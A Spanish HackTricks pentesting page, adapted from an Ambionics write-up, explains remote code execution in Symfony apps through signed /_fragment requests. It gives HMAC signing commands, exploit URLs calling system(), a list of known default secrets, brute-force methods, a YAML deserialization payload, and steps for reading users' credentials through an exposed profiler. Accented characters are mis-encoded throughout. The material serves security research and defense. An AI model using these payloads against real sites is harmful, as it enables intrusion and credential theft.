# Symfony

<details>

<summary><strong>Aprende hacking en AWS de cero a h√©roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sigue** a **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de github de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Introducci√≥n <a href="#introduction" id="introduction"></a>

Desde su creaci√≥n en 2008, el uso del framework [Symfony](https://symfony.com) ha ido creciendo cada vez m√°s en aplicaciones basadas en PHP. Ahora es un componente central de muchos CMS conocidos, como [Drupal](https://www.drupal.org), [Joomla!](https://www.joomla.org), [eZPlatform](https://ezplatform.com) (anteriormente eZPublish), o [Bolt](https://bolt.cm), y se utiliza a menudo para construir sitios web personalizados.

Una de las caracter√≠sticas integradas de Symfony, dise√±ada para manejar [ESI (Edge-Side Includes)](https://en.wikipedia.org/wiki/Edge\_Side\_Includes), es la clase [`FragmentListener`](https://github.com/symfony/symfony/blob/5.1/src/Symfony/Component/HttpKernel/EventListener/FragmentListener.php). Esencialmente, cuando alguien emite una solicitud a `/_fragment`, este listener establece atributos de solicitud a partir de los par√°metros GET proporcionados. Dado que esto permite **ejecutar c√≥digo PHP arbitrario** (_m√°s sobre esto m√°s adelante_), la solicitud debe estar firmada usando un valor HMAC. La clave criptogr√°fica secreta de este HMAC se almacena bajo un valor de configuraci√≥n de Symfony llamado `secret`.

Este valor de configuraci√≥n, `secret`, tambi√©n se utiliza, por ejemplo, para construir tokens CSRF y tokens de funci√≥n "recu√©rdame". Dada su importancia, este valor debe ser obviamente muy aleatorio.

Desafortunadamente, hemos descubierto que a menudo, el `secret` tiene un **valor predeterminado**, o existen **formas de obtener el valor, forzarlo offline, o simplemente eludir la verificaci√≥n de seguridad con la que est√° involucrado**. Afecta notablemente a Bolt, eZPlatform y eZPublish.

Aunque esto puede parecer un problema de configuraci√≥n benigno, hemos encontrado que los valores predeterminados, forzables o adivinables est√°n **muy, muy a menudo presentes** en los CMS mencionados, as√≠ como en aplicaciones personalizadas. Esto se debe principalmente a no enfatizar lo suficiente su importancia en la documentaci√≥n o gu√≠as de instalaci√≥n.

Adem√°s, un atacante puede escalar vulnerabilidades de menor impacto para leer el `secret` (a trav√©s de una divulgaci√≥n de archivos), eludir el proceso de firma de `/_fragment` (usando un SSRF), ¬°e incluso filtrarlo a trav√©s de `phpinfo()`!

En este blogpost, describiremos c√≥mo se puede obtener el `secret` en varios CMS y en el framework base, y c√≥mo ejecutar c√≥digo usando dicho `secret`.

## Un poco de historia <a href="#a-little-bit-of-history" id="a-little-bit-of-history"></a>

Siendo un framework moderno, Symfony ha tenido que lidiar con la generaci√≥n de subpartes de una solicitud desde su creaci√≥n hasta nuestros d√≠as. Antes de `/_fragment`, estaba `/_internal` y `/_proxy`, que hac√≠an esencialmente lo mismo. Esto produjo muchas vulnerabilidades a lo largo de los a√±os: [CVE-2012-6432](https://symfony.com/blog/security-release-symfony-2-0-20-and-2-1-5-released#cve-2012-6432-code-execution-vulnerability-via-the-internal-routes), [CVE-2014-5245](https://symfony.com/blog/cve-2014-5245-direct-access-of-esi-urls-behind-a-trusted-proxy), y [CVE-2015-4050](https://symfony.com/blog/cve-2015-4050-esi-unauthorized-access), por ejemplo.

Desde Symfony 4, el `secret` se genera durante la instalaci√≥n, y la p√°gina `/_fragment` est√° desactivada por defecto. Uno podr√≠a pensar, por lo tanto, que la conjunci√≥n de ambos, tener un `secret` d√©bil y `/_fragment` habilitado, ser√≠a rara. No es as√≠: muchos frameworks dependen de versiones antiguas de Symfony (incluso la versi√≥n 2.x sigue estando muy presente), e implementan un valor `secret` est√°tico o lo generan de manera deficiente. Adem√°s, muchos dependen de ESI y, como tal, habilitan la p√°gina `/_fragment`. Adem√°s, como veremos, otras vulnerabilidades de menor impacto pueden permitir volcar el `secret`, incluso si se ha generado de forma segura.

## Ejecutando c√≥digo con la ayuda de `secret` <a href="#executing-code-with-the-help-of-secret" id="executing-code-with-the-help-of-secret"></a>

Primero demostraremos c√≥mo un atacante, teniendo conocimiento del valor de configuraci√≥n `secret`, puede obtener ejecuci√≥n de c√≥digo. Esto se hace para la √∫ltima versi√≥n de `symfony/http-kernel`, pero es similar para otras versiones.

### Usando `/_fragment` para ejecutar c√≥digo arbitrario <a href="#using-_fragment-to-run-arbitrary-code" id="using-_fragment-to-run-arbitrary-code"></a>

Como se mencion√≥ anteriormente, haremos uso de la p√°gina `/_fragment`.
```php
# ./vendor/symfony/http-kernel/EventListener/FragmentListener.php

class FragmentListener implements EventSubscriberInterface
{
public function onKernelRequest(RequestEvent $event)
{
$request = $event->getRequest();

# [1]
if ($this->fragmentPath !== rawurldecode($request->getPathInfo())) {
return;
}

if ($request->attributes->has('_controller')) {
// Is a sub-request: no need to parse _path but it should still be removed from query parameters as below.
$request->query->remove('_path');

return;
}

# [2]
if ($event->isMasterRequest()) {
$this->validateRequest($request);
}

# [3]
parse_str($request->query->get('_path', ''), $attributes);
$request->attributes->add($attributes);
$request->attributes->set('_route_params', array_replace($request->attributes->get('_route_params', []), $attributes));
$request->query->remove('_path');
}
}
```
`FragmentListener:onKernelRequest` se ejecutar√° en cada solicitud: si la ruta de la solicitud es `/_fragment` \[1], el m√©todo primero verificar√° que la solicitud sea v√°lida (_es decir_, debidamente firmada), y lanzar√° una excepci√≥n en caso contrario \[2]. Si las comprobaciones de seguridad tienen √©xito, analizar√° el par√°metro `_path` codificado en la URL y establecer√° los atributos de `$request` en consecuencia.

Los atributos de la solicitud no deben confundirse con los par√°metros de la solicitud HTTP: son valores internos, mantenidos por Symfony, que generalmente no pueden ser especificados por un usuario. Uno de estos atributos de la solicitud es `_controller`, que especifica qu√© controlador de Symfony (una tupla _(clase, m√©todo)_ o simplemente una _funci√≥n_) debe ser llamado. Los atributos cuyo nombre no comienza con `_` son argumentos que se van a proporcionar al controlador. Por ejemplo, si quisi√©ramos llamar a este m√©todo:
```php
class SomeClass
{
public function someMethod($firstMethodParam, $secondMethodParam)
{
...
}
}
```
Establecer√≠amos `_path` a:

`_controller=SomeClass::someMethod&firstMethodParam=test1&secondMethodParam=test2`

La solicitud se ver√≠a entonces as√≠:

`http://symfony-site.com/_fragment?_path=_controller%3DSomeClass%253A%253AsomeMethod%26firstMethodParam%3Dtest1%26secondMethodParam%3Dtest2&_hash=...`

Esencialmente, esto permite llamar a cualquier funci√≥n o m√©todo de cualquier clase, con cualquier par√°metro. Dada la gran cantidad de clases que tiene Symfony, **conseguir la ejecuci√≥n de c√≥digo es trivial**. Podemos, por ejemplo, llamar a `system()`:

`http://localhost:8000/_fragment?_path=_controller%3Dsystem%26command%3Did%26return_value%3Dnull&_hash=...`

_Llamar a system no funcionar√° siempre: consulta la secci√≥n de Exploit para obtener m√°s detalles sobre las sutilezas de la explotaci√≥n._

Un problema permanece: ¬øc√≥mo verifica Symfony la firma de la solicitud?

### Firmando la URL <a href="#signing-the-url" id="signing-the-url"></a>

Para verificar la firma de una URL, se calcula un HMAC contra la _URL completa_. El hash obtenido se compara entonces con el especificado por el usuario.

En t√©rminos de c√≥digo, esto se hace en dos lugares:
```php
# ./vendor/symfony/http-kernel/EventListener/FragmentListener.php

class FragmentListener implements EventSubscriberInterface
{
protected function validateRequest(Request $request)
{
// is the Request safe?
if (!$request->isMethodSafe()) {
throw new AccessDeniedHttpException();
}

// is the Request signed?
if ($this->signer->checkRequest($request)) {
return;
}

# [3]
throw new AccessDeniedHttpException();
}
}

# ./vendor/symfony/http-kernel/UriSigner.php

class UriSigner
{
public function checkRequest(Request $request): bool
{
$qs = ($qs = $request->server->get('QUERY_STRING')) ? '?'.$qs : '';

// we cannot use $request->getUri() here as we want to work with the original URI (no query string reordering)
return $this->check($request->getSchemeAndHttpHost().$request->getBaseUrl().$request->getPathInfo().$qs);
}

/**
* Checks that a URI contains the correct hash.
*
* @return bool True if the URI is signed correctly, false otherwise
*/
public function check(string $uri)
{
$url = parse_url($uri);
if (isset($url['query'])) {
parse_str($url['query'], $params);
} else {
$params = [];
}

if (empty($params[$this->parameter])) {
return false;
}

$hash = $params[$this->parameter];
unset($params[$this->parameter]);

# [2]
return hash_equals($this->computeHash($this->buildUrl($url, $params)), $hash);
}

private function computeHash(string $uri): string
{
# [1]
return base64_encode(hash_hmac('sha256', $uri, $this->secret, true));
}

private function buildUrl(array $url, array $params = []): string
{
ksort($params, SORT_STRING);
$url['query'] = http_build_query($params, '', '&');

$scheme = isset($url['scheme']) ? $url['scheme'].'://' : '';
$host = isset($url['host']) ? $url['host'] : '';
$port = isset($url['port']) ? ':'.$url['port'] : '';
$user = isset($url['user']) ? $url['user'] : '';
$pass = isset($url['pass']) ? ':'.$url['pass'] : '';
$pass = ($user || $pass) ? "$pass@" : '';
$path = isset($url['path']) ? $url['path'] : '';
$query = isset($url['query']) && $url['query'] ? '?'.$url['query'] : '';
$fragment = isset($url['fragment']) ? '#'.$url['fragment'] : '';

return $scheme.$user.$pass.$host.$port.$path.$query.$fragment;
}
}
```
En resumen, Symfony extrae el par√°metro GET `_hash`, luego reconstruye la URL completa, por ejemplo `https://symfony-site.com/_fragment?_path=controller%3d...%26argument1=test%26...`, calcula un HMAC de esta URL utilizando el `secret` como clave \[1], y lo compara con el valor de hash dado \[2]. Si no coinciden, se lanza una excepci√≥n `AccessDeniedHttpException` \[3], resultando en un error `403`.

### Ejemplo <a href="#example" id="example"></a>

Para probar esto, configuramos un entorno de prueba y extraemos el secreto (en este caso, generado aleatoriamente).
```
$ git clone https://github.com/symfony/skeleton.git
$ cd skeleton
$ composer install
$ sed -i -E 's/#(esi|fragment)/\1/g' config/packages/framework.yaml # Enable ESI/fragment
$ grep -F APP_SECRET .env # Find secret
APP_SECRET=50c8215b436ebfcc1d568effb624a40e
$ cd public
$ php -S 0:8000
```
Ahora, al visitar `http://localhost:8000/_fragment` se obtiene un `403`. Intentemos ahora proporcionar una firma v√°lida:
```
$ php -r "echo(urlencode(base64_encode(hash_hmac('sha256', 'http://localhost:8000/_fragment', '50c8215b436ebfcc1d568effb624a40e', 1))) . PHP_EOL);"
lNweS5nNP8QCtMqyqrW8HIl4j9JXIfscGeRm%2FcmFOh8%3D
```
Al verificar `http://localhost:8000/_fragment?_hash=lNweS5nNP8QCtMqyqrW8HIl4j9JXIfscGeRm%2FcmFOh8%3D`, ahora tenemos un c√≥digo de estado `404`. La firma era correcta, pero no especificamos ning√∫n atributo de solicitud, por lo que Symfony no encuentra nuestro controlador.

Dado que podemos llamar a cualquier m√©todo, con cualquier argumento, podemos, por ejemplo, elegir `system($command, $return_value)`, y proporcionar un payload de la siguiente manera:
```
$ page="http://localhost:8000/_fragment?_path=_controller%3Dsystem%26command%3Did%26return_value%3Dnull"
$ php -r "echo(urlencode(base64_encode(hash_hmac('sha256', '$page', '50c8215b436ebfcc1d568effb624a40e', 1))) . PHP_EOL);"
GFhQ4Hr1LIA8mO1M%2FqSfwQaSM8xQj35vPhyrF3hvQyI%3D
```
Podemos ahora visitar la URL del exploit: `http://localhost:8000/_fragment?_path=_controller%3Dsystem%26command%3Did%26return_value%3Dnull&_hash=GFhQ4Hr1LIA8mO1M%2FqSfwQaSM8xQj35vPhyrF3hvQyI%3D`.

A pesar del error `500`, podemos ver que **nuestro comando se ejecut√≥**.

_RCE usando fragment_

![1](https://www.ambionics.io/images/symfony-secret-fragment/1.png)

## Encontrando secretos <a href="#finding-secrets" id="finding-secrets"></a>

De nuevo: nada de esto importar√≠a si los secretos no fueran accesibles. A menudo, lo son. Describiremos varias formas de obtener ejecuci√≥n de c√≥digo sin conocimiento previo.

### A trav√©s de vulnerabilidades <a href="#through-vulnerabilities" id="through-vulnerabilities"></a>

Comencemos con lo obvio: usar vulnerabilidades de menor impacto para obtener el secreto.

#### Lectura de archivos <a href="#file-read" id="file-read"></a>

Evidentemente, una vulnerabilidad de lectura de archivos podr√≠a usarse para leer los siguientes archivos y obtener `secret`:

* `app/config/parameters.yml`
* `.env`

_Como ejemplo, algunas barras de herramientas de depuraci√≥n de Symfony permiten leer archivos._

#### PHPinfo <a href="#phpinfo" id="phpinfo"></a>

En versiones recientes de Symfony (3.x), `secret` se almacena en `.env` como `APP_SECRET`. Dado que luego se importa como una variable de entorno, se pueden ver a trav√©s de una p√°gina `phpinfo()`.

_Filtrando APP\_SECRET a trav√©s de phpinfo_

![2](https://www.ambionics.io/images/symfony-secret-fragment/2.png)

Esto se puede hacer notablemente a trav√©s del paquete profiler de Symfony, como demuestra la captura de pantalla.

#### SSRF / Suplantaci√≥n de IP (CVE-2014-5245) <a href="#ssrf-ip-spoofing-cve-2014-5245" id="ssrf-ip-spoofing-cve-2014-5245"></a>

El c√≥digo detr√°s de `FragmentListener` ha evolucionado a lo largo de los a√±os: hasta la versi√≥n _2.5.3_, cuando la solicitud proven√≠a de un proxy de confianza (l√©ase: `localhost`), se considerar√≠a segura y, como tal, no se verificar√≠a el hash. Un SSRF, por ejemplo, puede permitir ejecutar c√≥digo inmediatamente, independientemente de tener `secret` o no. Esto afecta notablemente a eZPublish hasta 2014.7.
```php
# ./vendor/symfony/symfony/src/Symfony/Component/HttpKernel/EventListener/FragmentListener.php
# Symfony 2.3.18

class FragmentListener implements EventSubscriberInterface
{
protected function validateRequest(Request $request)
{
// is the Request safe?
if (!$request->isMethodSafe()) {
throw new AccessDeniedHttpException();
}

// does the Request come from a trusted IP?
$trustedIps = array_merge($this->getLocalIpAddresses(), $request->getTrustedProxies());
$remoteAddress = $request->server->get('REMOTE_ADDR');
if (IpUtils::checkIp($remoteAddress, $trustedIps)) {
return;
}

// is the Request signed?
// we cannot use $request->getUri() here as we want to work with the original URI (no query string reordering)
if ($this->signer->check($request->getSchemeAndHttpHost().$request->getBaseUrl().$request->getPathInfo().(null !== ($qs = $request->server->get('QUERY_STRING')) ? '?'.$qs : ''))) {
return;
}

throw new AccessDeniedHttpException();
}

protected function getLocalIpAddresses()
{
return array('127.0.0.1', 'fe80::1', '::1');
}
```
### A trav√©s de valores predeterminados <a href="#through-default-values" id="through-default-values"></a>

#### Symfony <= 3.4.43: `ThisTokenIsNotSoSecretChangeIt` <a href="#symfony-3443-thistokenisnotsosecretchangeit" id="symfony-3443-thistokenisnotsosecretchangeit"></a>

Al configurar un sitio web Symfony, el primer paso es instalar el esqueleto [symfony-standard](https://github.com/symfony/symfony-standard). Una vez instalado, se solicita ingresar algunos valores de configuraci√≥n. Por defecto, la clave es `ThisTokenIsNotSoSecretChangeIt`.

_Instalaci√≥n de Symfony a trav√©s de composer_

![3](https://www.ambionics.io/images/symfony-secret-fragment/3.png)

En versiones posteriores (4+), la clave secreta se genera de forma segura.

#### ezPlatform 3.x (√∫ltima): `ff6dc61a329dc96652bb092ec58981f7` <a href="#ezplatform-3x-latest-ff6dc61a329dc96652bb092ec58981f7" id="ezplatform-3x-latest-ff6dc61a329dc96652bb092ec58981f7"></a>

[ezPlatform](https://ezplatform.com), el sucesor de [ezPublish](https://en.wikipedia.org/wiki/EZ\_Publish), todav√≠a utiliza Symfony. El 10 de junio de 2019, un [commit](https://github.com/ezsystems/ezplatform/commit/974f2a70d9d0507ba7ca17226693b1a4967f23cf#diff-f579cccc964135c7d644c7b2d3b0d3ecR59) estableci√≥ la clave predeterminada en `ff6dc61a329dc96652bb092ec58981f7`. Las versiones vulnerables van desde 3.0-alpha1 hasta 3.1.1 (actual).

Aunque la [documentaci√≥n](https://doc.ezplatform.com/en/latest/getting\_started/install\_ez\_platform/#change-installation-parameters) indica que se debe cambiar el secreto, no se hace cumplir.

#### ezPlatform 2.x: `ThisEzPlatformTokenIsNotSoSecret_PleaseChangeIt` <a href="#ezplatform-2x-thisezplatformtokenisnotsosecret_pleasechangeit" id="ezplatform-2x-thisezplatformtokenisnotsosecret_pleasechangeit"></a>

Al igual que el esqueleto de Symfony, se le pedir√° que ingrese un secreto durante la instalaci√≥n. El valor predeterminado es `ThisEzPlatformTokenIsNotSoSecret_PleaseChangeIt`.

#### Bolt CMS <= 3.7 (√∫ltima): `md5(__DIR__)` <a href="#bolt-cms-37-latest-md5__dir__" id="bolt-cms-37-latest-md5__dir__"></a>

[Bolt CMS](https://bolt.cm) utiliza [Silex](https://github.com/silexphp/Silex), un micro-framework obsoleto basado en Symfony. Configura la clave secreta utilizando este c√°lculo:
```php
# ./vendor/silex/silex/src/Silex/Provider/HttpFragmentServiceProvider.php
$app['uri_signer.secret'] = md5(__DIR__);

# ./vendor/silex/silex/src/Silex/Provider/FormServiceProvider.php
$app['form.secret'] = md5(__DIR__);
```
Como tal, uno puede adivinar el secreto o utilizar una vulnerabilidad de Full Path Disclosure para calcularlo.

Si no tuviste √©xito con las claves secretas predeterminadas, no te desesperes: hay otras formas.

### Fuerza bruta <a href="#bruteforce" id="bruteforce"></a>

Dado que el secreto a menudo se establece manualmente (en lugar de generarse aleatoriamente), las personas a menudo usar√°n una frase de paso en lugar de un valor aleatorio seguro, lo que lo hace susceptible a fuerza bruta si tenemos un hash contra el cual realizar la fuerza bruta. Obviamente, una URL v√°lida de `/_fragment`, como una generada por Symfony, nos proporcionar√≠a una tupla de mensaje-hash v√°lida para forzar bruta el secreto.

_Una solicitud v√°lida al fragmento se incluye en la respuesta_

![4](https://www.ambionics.io/images/symfony-secret-fragment/4.png)

Al principio de este blogpost, dijimos que el secreto de Symfony ten√≠a varios usos. Uno de esos usos es que tambi√©n se utiliza para generar tokens CSRF. Otro uso de `secret` es firmar cookies de recordar usuario. En algunos casos, un atacante puede usar su propio token CSRF o cookie de recordar usuario para forzar bruta el valor de `secret`.

_La ingenier√≠a inversa de la construcci√≥n de esos tokens se deja como ejercicio para el lector._

### Profundizando: eZPublish <a href="#going-further-ezpublish" id="going-further-ezpublish"></a>

Como ejemplo de c√≥mo los secretos pueden ser forzados bruta para lograr la ejecuci√≥n de c√≥digo, veremos c√≥mo podemos descubrir el secreto de eZPublish 2014.07.

#### Encontrando material para fuerza bruta <a href="#finding-bruteforce-material" id="finding-bruteforce-material"></a>

eZPublish genera sus tokens CSRF de la siguiente manera:
```php
# ./ezpublish_legacy/extension/ezformtoken/event/ezxformtoken.php
self::$token = sha1( self::getSecret() . self::getIntention() . session_id() );
```
Para construir este token, eZP utiliza dos valores que conocemos, y el secreto: `getIntention()` es la acci√≥n que el usuario est√° intentando realizar (`authenticate` por ejemplo), `session_id()` es el ID de sesi√≥n de PHP, y `getSecret()`, bueno, es el `secret` de Symfony.

Dado que los tokens CSRF se pueden encontrar en algunos formularios, ahora tenemos el material para forzar bruscamente el secreto.

Desafortunadamente, ezPublish incorpor√≥ un paquete de sensiolabs, [sensio/distribution-bundle](https://packagist.org/packages/sensio/distribution-bundle). Este paquete asegura que la clave secreta sea aleatoria. La genera de esta manera, durante la instalaci√≥n:
```php
# ./vendor/sensio/distribution-bundle/Sensio/Bundle/DistributionBundle/Configurator/Step/SecretStep.php

private function generateRandomSecret()
{
return hash('sha1', uniqid(mt_rand()));
}
```
Esto parece muy dif√≠cil de forzar bruscamente: `mt_rand()` puede producir 231 valores diferentes, y `uniqid()` se construye a partir de la marca de tiempo actual (con microsegundos).
```php
// Simplified uniqid code

struct timeval tv;
gettimeofday(&tv, NULL);
return strpprintf(0, "%s%08x%05x", prefix, tv.tv_sec, tv.tv_usec);
```
#### Revelando el timestamp <a href="#disclosing-the-timestamp" id="disclosing-the-timestamp"></a>

Afortunadamente, sabemos que este secreto se genera en el √∫ltimo paso de la instalaci√≥n, justo despu√©s de que se configura el sitio web. Esto significa que probablemente podemos filtrar el timestamp utilizado para generar este hash.

Una forma de hacerlo es utilizando los registros (_por ejemplo_, `/var/log/storage.log`); se puede filtrar la primera vez que se cre√≥ una entrada de cach√©. La entrada de cach√© se crea justo despu√©s de que se llama a `generateRandomSecret()`.

_Contenido de muestra del registro: el timestamp es similar al utilizado para calcular el secreto_

![5](https://www.ambionics.io/images/symfony-secret-fragment/5.png)

Si los registros no est√°n disponibles, se puede utilizar el motor de b√∫squeda muy potente de eZPublish para encontrar el momento de creaci√≥n del primer elemento del sitio web. De hecho, cuando se crea el sitio, se introducen muchos timestamps en la base de datos. Esto significa que el timestamp de los datos iniciales del sitio web eZPublish es el mismo que se utiliz√≥ para calcular `uniqid()`. Podemos buscar el _ContentObject_ `landing_page` y descubrir su timestamp.

## Fuerza bruta para los bits faltantes <a href="#bruteforcing-the-missing-bits" id="bruteforcing-the-missing-bits"></a>

Ahora estamos al tanto del timestamp utilizado para calcular el secreto, as√≠ como de un hash de la siguiente forma:
```php
$random_value = mt_rand();
$timestamp_hex = sprintf("%08x%05x", $known_timestamp, $microseconds);
$known_plaintext = '<intention><sessionID>';
$known_hash = sha1(sha1(mt_rand() . $timestamp_hex) . $known_plaintext);
```
Esto nos deja con un total de 231 \* 106 posibilidades. Parece factible con [hashcat](https://hashcat.net) y un buen conjunto de GPUs, pero hashcat no proporciona un kernel `sha1(sha1($pass).$salt)`. Afortunadamente, ¬°lo implementamos! Puedes encontrar [la solicitud de extracci√≥n aqu√≠](https://github.com/hashcat/hashcat/pull/2536).

Usando nuestra m√°quina de cracking, que cuenta con 8 GPUs, podemos descifrar este hash en _menos de 20 horas_.

Despu√©s de obtener el hash, podemos usar `/_fragment` para ejecutar c√≥digo.

## Conclusi√≥n <a href="#conclusion" id="conclusion"></a>

Symfony es ahora un componente central de muchas aplicaciones PHP. Como tal, cualquier riesgo de seguridad que afecte al framework afecta a muchos sitios web. Como se demostr√≥ en este art√≠culo, ya sea una clave secreta d√©bil o una vulnerabilidad de menor impacto permite a los atacantes obtener **ejecuci√≥n de c√≥digo remoto**.

Como miembro de un equipo azul, deber√≠as revisar todos tus sitios web que dependen de Symfony. El software actualizado no puede descartarse por vulnerabilidades, ya que la clave secreta se genera en la primera instalaci√≥n del producto. Por lo tanto, si creaste un sitio web basado en Symfony-3.x hace unos a√±os y lo mantuviste actualizado en el camino, es probable que la clave secreta siga siendo la predeterminada.

## Explotaci√≥n <a href="#exploitation" id="exploitation"></a>

### Teor√≠a <a href="#theory" id="theory"></a>

Por un lado, tenemos algunas preocupaciones al explotar esta vulnerabilidad:

* El HMAC se calcula usando la **URL completa**. Si el sitio web est√° detr√°s de un proxy inverso, necesitamos usar la URL interna del servicio en lugar de la que estamos enviando nuestro payload. Por ejemplo, la URL interna podr√≠a ser sobre HTTP en lugar de HTTPS.
* El algoritmo de HMAC ha cambiado a lo largo de los a√±os: era **SHA-1** antes y ahora es **SHA-256**.
* Dado que Symfony elimina el par√°metro `_hash` de la solicitud y luego genera la URL de nuevo, necesitamos calcular el hash en la misma URL que lo hace.
* Hay muchas claves secretas que se pueden usar, por lo que necesitamos verificarlas todas.
* En algunas versiones de PHP, no podemos llamar a funciones que tienen par√°metros "por referencia", como `system($command, &$return_value)`.
* En algunas versiones de Symfony, `_controller` no puede ser una funci√≥n, tiene que ser un m√©todo. Necesitamos encontrar un m√©todo de Symfony que nos permita ejecutar c√≥digo.

Por otro lado, podemos aprovechar algunas cosas:

* Acceder a `/_fragment` sin par√°metros, o con un hash inv√°lido, deber√≠a devolver un `403`.
* Acceder a `/_fragment` con un hash v√°lido pero sin un controlador v√°lido deber√≠a producir un `500`.

El √∫ltimo punto nos permite probar valores secretos sin preocuparnos por qu√© funci√≥n o m√©todo vamos a llamar despu√©s.

### Pr√°ctica <a href="#practice" id="practice"></a>

Supongamos que estamos atacando `https://target.com/_fragment`. Para poder firmar correctamente una URL, necesitamos conocimiento de:

* URL interna: podr√≠a ser `https://target.com/_fragment`, o quiz√°s `http://target.com/_fragment`, o algo completamente diferente (_por ejemplo_, `http://target.website.internal`), lo cual no podemos adivinar
* Clave secreta: tenemos una lista de claves secretas habituales, como `ThisTokenIsNotSoSecretChangeIt`, `ThisEzPlatformTokenIsNotSoSecret_PleaseChangeIt`, etc.
* Algoritmo: SHA1 o SHA256

No necesitamos preocuparnos por el payload efectivo (el contenido de `_path`) todav√≠a, porque una URL firmada correctamente no resultar√° en una excepci√≥n `AccessDeniedHttpException`, y como tal no resultar√° en un `403`. Por lo tanto, el exploit intentar√° cada combinaci√≥n de `(algoritmo, URL, secreto)`, generar√° una URL y verificar√° si no produce un c√≥digo de estado `403`.

_Una solicitud v√°lida a `/_fragment`, sin el par√°metro `_path`_

![6](https://www.ambionics.io/images/symfony-secret-fragment/6.png)

En este punto, podemos firmar cualquier URL de `/_fragment`, lo que significa que es un RCE garantizado. Solo es cuesti√≥n de qu√© llamar.

Luego, necesitamos averiguar si podemos llamar a una funci√≥n directamente, o si necesitamos usar un m√©todo de clase. Podemos intentar primero la forma m√°s directa y sencilla, usando una funci√≥n como `phpinfo ([ int $what = INFO_ALL ] )` ([documentaci√≥n](https://www.php.net/manual/en/function.phpinfo.php)). El par√°metro GET `_path` se ver√≠a as√≠:
```
_controller=phpinfo
&what=-1
```
Y la URL se ver√≠a as√≠:

`http://target.com/_fragment?_path=_controller%3Dphpinfo%26what%3D-1&_hash=...`

Si la respuesta HTTP muestra una p√°gina `phpinfo()`, ganamos. Luego podemos intentar usar otra funci√≥n, como `assert`:

_Ejemplo de salida usando `_controller=assert`_

![7](https://www.ambionics.io/images/symfony-secret-fragment/7.png)

De lo contrario, esto significa que necesitaremos usar un m√©todo de clase en su lugar. Un buen candidato para esto es `Symfony\Component\Yaml\Inline::parse`, que es una clase incorporada de Symfony y, como tal, est√° presente en sitios web de Symfony.

Obviamente, este m√©todo analiza una cadena de entrada YAML. El analizador [YAML](https://yaml.org) de Symfony admite la etiqueta `php/object`, que convertir√° una cadena de entrada serializada en un objeto utilizando `unserialize()`. ¬°Esto nos permite usar nuestra herramienta PHP favorita, [PHPGGC](https://github.com/ambionics/phpggc)!

El prototipo del m√©todo ha cambiado a lo largo de los a√±os. Por ejemplo, aqu√≠ hay tres prototipos diferentes:
```
public static function parse($value, $flags, $references);
public static function parse($value, $exceptionOnInvalidType, $objectSupport);
public static function parse($value, $exceptionOnInvalidType, $objectSupport, $objectForMap, $references);
```
```markdown
En lugar de construir `_path` para cada uno de estos, podemos aprovechar el hecho de que si damos un argumento cuyo nombre no coincide con el prototipo del m√©todo, ser√° ignorado. Por lo tanto, podemos agregar todos los argumentos posibles al m√©todo, sin preocuparnos por el prototipo real.

Por lo tanto, podemos construir `_path` de la siguiente manera:
```
```
_controller=Symfony\Component\Yaml\Inline::parse
&value=!php/object O:32:"Monolog\Handler\SyslogUdpHandler":...
&flags=516
&exceptionOnInvalidType=0
&objectSupport=1
&objectForMap=0
&references=
&flags=516
```
De nuevo, podemos intentar con `phpinfo()`, y ver si funciona. Si lo hace, podemos usar `system()` en su lugar.

_Salida de muestra usando `Inline::parse` con una carga √∫til serializada_

![8](https://www.ambionics.io/images/symfony-secret-fragment/8.png)

El exploit, por lo tanto, ejecutar√° todas las posibles combinaciones de variables y luego probar√° los dos m√©todos de explotaci√≥n. El c√≥digo est√° disponible en [nuestro GitHub](https://github.com/ambionics/symfony-exploits).

## Accediendo a la informaci√≥n de symfony /\_profiler

![f:id:flattsecurity:20201021204553p:plain](https://cdn-ak.f.st-hatena.com/images/fotolife/f/flattsecurity/20201021/20201021204553.png)

Como ves en la captura de pantalla anterior, hay un logo de `sf` en la parte inferior derecha de la p√°gina. Este logo se muestra cuando Symfony est√° en modo de depuraci√≥n. Hay casos en los que este logo no aparece, as√≠ que intenta acceder a `/_profiler` y ver√°s la p√°gina como se muestra a continuaci√≥n

![f:id:flattsecurity:20201021204605p:plain](https://cdn-ak.f.st-hatena.com/images/fotolife/f/flattsecurity/20201021/20201021204605.png)

Esta caracter√≠stica se llama Symfony Profiler, y no hay mucha informaci√≥n sobre esta caracter√≠stica en internet. La intenci√≥n de esta caracter√≠stica es muy clara; te ayuda a depurar cuando hay un error o un bug. Por supuesto, esta caracter√≠stica solo se puede usar cuando el modo de depuraci√≥n est√° habilitado.

El framework Symfony en s√≠ es muy seguro, pero habilitar el modo de depuraci√≥n har√° que este framework sea extremadamente vulnerable. Por ejemplo, Profiler tiene una caracter√≠stica llamada B√∫squeda de Perfiles, como la siguiente captura de pantalla.

![f:id:flattsecurity:20201021204624p:plain](https://cdn-ak.f.st-hatena.com/images/fotolife/f/flattsecurity/20201021/20201021204624.png)

Como ves en la captura de pantalla anterior, puedes acceder a todas las solicitudes enviadas al servidor. Al hacer clic en los hashes en el token, ver√°s que todos los par√°metros POST se pueden leer, como se ve en la siguiente captura de pantalla. Con esta caracter√≠stica, podemos secuestrar las credenciales de las cuentas de administradores y usuarios.

![f:id:flattsecurity:20201021204637p:plain](https://cdn-ak.f.st-hatena.com/images/fotolife/f/flattsecurity/20201021/20201021204637.png)

### Otros Endpoints con Depuraci√≥n Habilitada

Tambi√©n deber√≠as revisar estas URLs:

* **https://example.com/app\_dev.php/\_profiler**
* **https://example.com/app\_dev.php**\\

## Referencias

* [**https://www.ambionics.io/blog/symfony-secret-fragment**](https://www.ambionics.io/blog/symfony-secret-fragment)
